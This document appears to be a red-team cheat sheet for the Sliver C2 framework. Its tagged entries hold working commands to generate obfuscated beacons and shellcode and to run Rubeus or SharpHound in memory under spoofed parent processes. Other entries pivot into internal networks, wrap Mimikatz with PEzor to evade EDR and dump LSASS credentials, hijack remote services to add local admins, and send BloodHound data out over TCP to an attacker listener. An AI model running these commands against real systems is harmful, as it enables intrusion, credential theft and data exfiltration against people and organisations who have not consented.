# Sliver C2 – Setup & Operations

### Sliver Server Setup (WSL / Linux) [added: 2026-04]
- **Tags:** #Sliver #C2 #SliverServer #HTTPS #Linux #WSL #CommandAndControl #Setup
- **Trigger:** Need to establish a command-and-control server for managing implants during an engagement
- **Prereq:** Linux/WSL host with sliver-server binary downloaded + network connectivity to target environment
- **Yields:** Running Sliver C2 server ready to generate implants and receive callbacks
- **Opsec:** Low
- **Context:** Run Sliver on Linux/WSL. Use HTTPS for egress.
- **Payload/Method:**
```bash
cd /opt/Pentester/ptTools/Network/C2/Sliver/Linux
sudo ./sliver-server_linux-amd64
```

### Generate HTTPS Beacon (EXE + Shellcode) [added: 2026-04]
- **Tags:** #Sliver #Beacon #HTTPS #Shellcode #ImplantGeneration #ShikataGaNai #Obfuscation #C2
- **Trigger:** Sliver server running and need to generate an implant for initial access on a target host
- **Prereq:** Running Sliver server + HTTPS listener started + network route from target to C2 IP
- **Yields:** Obfuscated EXE or shellcode beacon that calls back to C2 over HTTPS
- **Opsec:** Med
- **Context:** Generate obfuscated implant for foothold machine calling back over HTTPS.
- **Payload/Method:**
```
# Start HTTPS listener
[server] sliver > https

# Generate EXE beacon with obfuscation
[server] sliver > generate beacon -b https://<C2_IP> -e -f exe -N beacon_name

# Generate shellcode beacon (with shikata-ga-nai encoding)
[server] sliver > generate beacon -b https://<C2_IP> -e -f shellcode -N beacon_name
```

### execute-assembly – In-Memory .NET Execution [added: 2026-04]
- **Tags:** #ExecuteAssembly #Sliver #DotNet #InMemory #Rubeus #SharpHound #Certify #LOLBIN
- **Trigger:** Need to run offensive C# tooling (Rubeus, SharpHound, Certify) on target without writing to disk
- **Prereq:** Active Sliver session on target + compiled .NET assembly of the desired tool on C2 host
- **Yields:** In-memory execution of .NET offensive tools with output returned to C2, avoiding disk-based detection
- **Opsec:** Med
- **Context:** Run C# tools (Rubeus, SharpHound, Certify, etc.) in-memory under a spoofed parent process. Avoids writing to disk.
- **Payload/Method:**
```
# Fork-and-run under specific PID (blend into legitimate process)
[server] sliver (session) > execute-assembly -P <PARENT_PID> -p 'C:\windows\System32\taskhostw.exe' -t 60 '<TOOLS_DIR>/ToolName.exe' 'arguments'

# Inline execution (runs within beacon process – fewer forks but less stable)
[server] sliver (session) > inline-execute-assembly -t 40 '<TOOLS_DIR>/Rubeus.exe' 'ptt /ticket:<BASE64>'
```

### TCP Pivot – Lateral Movement via Compromised Host [added: 2026-04]
- **Tags:** #TCPPivot #Sliver #LateralMovement #Pivoting #NtDropper #Shellcode #InternalPivot
- **Trigger:** Internal target machines cannot reach C2 directly but foothold host has network access to both C2 and internal targets
- **Prereq:** Active Sliver session on foothold host + network access from foothold to internal targets + NtDropper or similar shellcode loader
- **Yields:** New Sliver session on internal target routed through the foothold host via TCP pivot
- **Opsec:** Med
- **Context:** Internal machines can't reach C2 directly. Route their traffic through the foothold via TCP pivot.
- **Payload/Method:**
```
# Start TCP pivot listener on compromised pivot host
[server] sliver (foothold_session) > pivots tcp --lport 443

# Generate TCP pivot implant for internal target
[server] sliver (foothold_session) > generate --tcp-pivot <PIVOT_IP>:443 -f shellcode -e -N target_tcp

# Drop + execute shellcode on target via NtDropper
[server] sliver (foothold_session) > upload '<TOOLS_DIR>/NtDropper.exe' '\\target\c$\Windows\Temp\NtDropper.exe'
# Then trigger via scshell/service abuse
```

### Credential Dumping via PEzor-wrapped Mimikatz [added: 2026-04]
- **Tags:** #Mimikatz #PEzor #CredentialDumping #Ekeys #Sliver #EDREvasion #DotNetPacking #LSASS
- **Trigger:** Need to dump credentials from LSASS but Defender/EDR blocks direct mimikatz execution
- **Prereq:** PEzor installed on Linux/WSL + mimikatz.exe binary + active Sliver session with admin/SYSTEM privileges
- **Yields:** NTLM hashes, Kerberos encryption keys (ekeys), and plaintext passwords from LSASS memory
- **Opsec:** High
- **Context:** Defender blocks mimikatz.exe directly. Wrap it with PEzor into a .NET assembly for execute-assembly.
- **Payload/Method:**
```bash
# In WSL (as root)
cd <TOOLS_DIR>/PEzor/
sudo su
./PEzor.sh -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 <TOOLS_DIR>/PEzor/mimikatz.exe -z 2 -p '"privilege::debug" "token::elevate" "sekurlsa::ekeys" "exit"'
mv mimikatz.exe.packed.dotnet.exe mimikatz-ekeys.exe.packed.dotnet.exe
```
```
# Execute in Sliver, injecting under svcadmin's sqlservr.exe process
[server] sliver (mgmt_session) > execute-assembly -P <SQLSERVR_PID> -p 'C:\Program Files\Microsoft SQL Server\...\sqlservr.exe' -t 180 <TOOLS_DIR>/PEzor/mimikatz-ekeys.exe.packed.dotnet.exe
```

### Service Abuse via remote-sc-* BOF Commands [added: 2026-04]
- **Tags:** #ServiceAbuse #BOF #RemoteSC #Sliver #LateralMovement #LocalAdmin #ServiceHijack #Windows
- **Trigger:** Have admin access to a remote host and need to add a user to local admins or execute commands without touching LSASS
- **Prereq:** Active Sliver session with admin privileges + remote service control access to target host
- **Yields:** Local admin access on remote host or arbitrary command execution via service binary path hijack
- **Opsec:** Med
- **Context:** Remote service accessible, want to add local admin or get a new beacon without touching LSASS.
- **Payload/Method:**
```
# Add domain user to local admins via service hijack
[server] sliver (session) > remote-sc-stop -t 100 "" 'ServiceName'
[server] sliver (session) > remote-sc-config -t 100 "" 'ServiceName' 'C:\windows\system32\net.exe localgroup administrators DOMAIN\user /add' 1 2
[server] sliver (session) > remote-sc-start -t 100 "" 'ServiceName'
```

### BloodHound Collection via LACheck (with exfil over TCP socket) [added: 2026-04]
- **Tags:** #BloodHound #LACheck #ADEnum #Sliver #TCPExfil #DomainRecon #SharpHound #ActiveDirectory
- **Trigger:** Need to collect BloodHound-compatible AD enumeration data without writing zip files to disk
- **Prereq:** Active Sliver session with domain user credentials + LACheck binary + Kali listener on TCP port for exfil
- **Yields:** Full BloodHound-compatible domain enumeration data (users, groups, sessions, ACLs) exfiltrated directly over TCP
- **Opsec:** Med
- **Context:** Run full BloodHound-compatible enumeration in-memory and exfiltrate directly over TCP—no zip file on disk.
- **Payload/Method:**
```
[server] sliver (session) > execute-assembly -P <PID> -p 'C:\windows\System32\taskhostw.exe' -t 80 '<TOOLS_DIR>/LACheck.exe' 'smb rpc winrm /bloodhound /domain:<DOMAIN> /user:<USER>@<DOMAIN> /ldap:all /socket:<KALI_IP>:9001'
```

### Domain Admin Session Hunting via LACheck /logons [added: 2026-04]
- **Tags:** #SessionHunting #LACheck #DomainAdmin #LateralMovement #Sliver #ActiveDirectory #WinRM
- **Trigger:** Need to identify which hosts have Domain Admin sessions for targeted lateral movement
- **Prereq:** Active Sliver session with domain user credentials + LACheck binary + WinRM or SMB access to target hosts
- **Yields:** List of hosts with active Domain Admin sessions, identifying high-value lateral movement targets
- **Opsec:** Med
- **Context:** Find which servers have DA sessions active — target them for lateral movement.
- **Payload/Method:**
```
[server] sliver (ci_session) > execute-assembly -P <JENKINS_PID> -p 'C:\Program Files\...\java.exe' -t 180 '<TOOLS_DIR>/LACheck.exe' 'winrm /ldap:servers-exclude-dc /logons /threads:10 /domain:<DOMAIN>'
# Output shows: [session] TARGET-HOST - DOMAIN\svcadmin <timestamp>
```

### Sliver Profiles and Stager Listeners [added: 2026-04]
- **Tags:** #Sliver #Profiles #StagerListener #StagedPayload #C2 #Dropper #ImplantConfig
- **Trigger:** Need a smaller initial dropper that stages the full implant after execution (reducing initial payload size)
- **Prereq:** Running Sliver server + available TCP/HTTP port for stager listener
- **Yields:** Pre-configured implant profile paired with a stager listener for staged payload delivery
- **Opsec:** Med
- **Context:** Use profiles to pre-configure implant settings, then pair with a stager listener for staged payload delivery (smaller initial dropper).
- **Payload/Method:**
  ```
  [server] sliver > profiles new --http <C2_IP>:<PORT> --format shellcode <ProfileName>
  [server] sliver > stage-listener --url tcp://<C2_IP>:<PORT> --profile <ProfileName>
  ```

### Sliver Session Management [added: 2026-04]
- **Tags:** #Sliver #SessionManagement #Beacons #C2 #Housekeeping #TaskManagement #Operations
- **Trigger:** Need to list, prune, or kill active sessions and beacons during an engagement
- **Prereq:** Running Sliver server with active or stale sessions/beacons
- **Yields:** Clean session inventory with dead sessions pruned and specific sessions terminated as needed
- **Opsec:** Low
- **Context:** Manage active sessions and beacons — prune dead ones, kill specific sessions, list pending tasks.
- **Payload/Method:**
  ```
  [server] sliver > sessions              # List all sessions
  [server] sliver > sessions -K           # Kill ALL sessions
  [server] sliver > sessions prune        # Remove unavailable sessions
  [server] sliver > sessions -k -i <ID>   # Kill specific session
  [server] sliver > beacons               # List all beacons
  [server] sliver > tasks                 # List pending/completed tasks
  ```

### Sliver Beacon to Interactive Session [added: 2026-04]
- **Tags:** #Sliver #Beacon #InteractiveSession #C2 #RealTime #SessionUpgrade
- **Trigger:** Have an async beacon but need real-time interactive shell access for time-sensitive operations
- **Prereq:** Active Sliver beacon with check-in capability
- **Yields:** Real-time interactive session from async beacon, enabling immediate command execution
- **Opsec:** Med
- **Context:** Beacons are async (check-in interval). When you need real-time interaction, spawn an interactive session from a beacon.
- **Payload/Method:**
  ```
  [server] sliver (beacon) > interactive
  ```

### Sliver Privilege Escalation: getsystem [added: 2026-04]
- **Tags:** #Sliver #GetSystem #PrivEsc #SYSTEM #Windows #TokenManipulation #ElevatePrivilege
- **Trigger:** Have admin-level Sliver session and need to escalate to NT AUTHORITY\SYSTEM
- **Prereq:** Active Sliver session with local administrator privileges on the target Windows host
- **Yields:** NT AUTHORITY\SYSTEM level access on the target host
- **Opsec:** Med
- **Context:** Attempt to elevate to NT AUTHORITY\SYSTEM from an admin-level session.
- **Payload/Method:**
  ```
  [server] sliver (session) > getsystem
  ```

### Sliver Armory: Install Extensions and Aliases [added: 2026-04]
- **Tags:** #Sliver #Armory #Extensions #BOF #CommunityTools #Aliases #ToolInstall
- **Trigger:** Need additional offensive capabilities (BOFs, tools) not built into Sliver by default
- **Prereq:** Running Sliver server with internet access (or pre-downloaded armory packages)
- **Yields:** Extended Sliver capabilities with community BOFs, aliases, and extensions ready for use
- **Opsec:** Low
- **Context:** Sliver's armory provides community extensions (BOFs, tools). Install individually or all at once.
- **Payload/Method:**
  ```
  [server] sliver > armory install <alias_or_extension>
  [server] sliver > armory install all
  ```

### Sliver Multiplayer Mode [added: 2026-04]
- **Tags:** #Sliver #Multiplayer #TeamOps #MultiOperator #C2 #Collaboration #RedTeam
- **Trigger:** Multiple operators need simultaneous access to the same Sliver C2 server during a team engagement
- **Prereq:** Running Sliver server + operator config files generated for each team member
- **Yields:** Multi-operator C2 environment where all team members can interact with sessions and beacons simultaneously
- **Opsec:** Low
- **Context:** Enable multiple operators to connect to the same Sliver server simultaneously for team operations.
- **Payload/Method:**
  ```
  [server] sliver > multiplayer
  ```
